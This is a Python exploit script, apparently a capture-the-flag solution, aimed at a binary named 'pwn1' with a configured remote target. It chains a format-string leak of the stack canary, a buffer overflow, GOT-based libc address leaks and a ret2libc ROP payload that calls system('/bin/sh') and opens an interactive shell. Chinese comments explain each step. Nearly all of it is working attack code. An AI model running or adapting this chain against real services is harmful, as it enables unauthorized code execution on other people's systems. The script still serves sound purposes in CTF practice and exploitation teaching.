import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os
set_config(GameBoxConfig(
    is_local=True,
    file='./pwn1',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
plt_write = elf.plt['puts']
main_addr = elf.symbols['main']

canary = b''


def exp_fmt(data: bytes):
    start_game()
    sla(b'your name:', data)
    rl()
    r = rc(20)
    print('line', r)
    return r


# position = formats.exp_get_str_position(exp_fmt)
position = 42  # formats.exp_get_str_position(exp_fmt)
log.info(f'position:{position}')
canary_pos = position - 11  # 发个aaaa，调试canary位置 - aaaa的位置 / size_arch
start_game()
sla(b'your name:', f'%{canary_pos}$p')
print('233', rl())  # 清空输出
canary = rc(10)  # canary is full-8bytes endwith 00
print(f'raw canary :{canary}')
canary = canary[2:10]
# canary = int(canary,16)
canary = bytes.fromhex(canary.decode())[::-1]  # little-indian
log.info(f'canary:{canary.hex()}')


def exp():
    # overflow position
    data = [b'a' * (100), canary, (b'' if not canary else fakeebp() * 3)]
    return data


def leak(func: str):
    log.info(f'leak:{func}')
    global canary
    # 泄露libc
    payload = exp()
    payload += [plt_write, main_addr, elf.got[func]]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    sla('messages', payload)
    # log.info(f'clear:{rl()}') # 清空输出
    data = rl()[1:5]  # 此处直接接收
    # data = rc(4)  # 32位接收4个
    print('data', data.hex())
    data = uc(data)

    s.add_condition(func, data)
    print('leak', func, hex(data))
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
leak('__libc_start_main')
sl('123')
ru(b'123')  # 此处因为样本read了2次，需要跳过第一次
leak('puts')


# libc = ELF('libc_buu-2.23_x86.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset


sl('123')
ru(b'123')  # 此处因为样本read了2次，需要跳过第一次

data = s.dump(db_index=0)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')

payload = exp()
payload += [elf.rop['ret']]  # 栈平衡
payload += [system_addr, fakeebp(), binsh_addr]
sl(payload)
interactive()
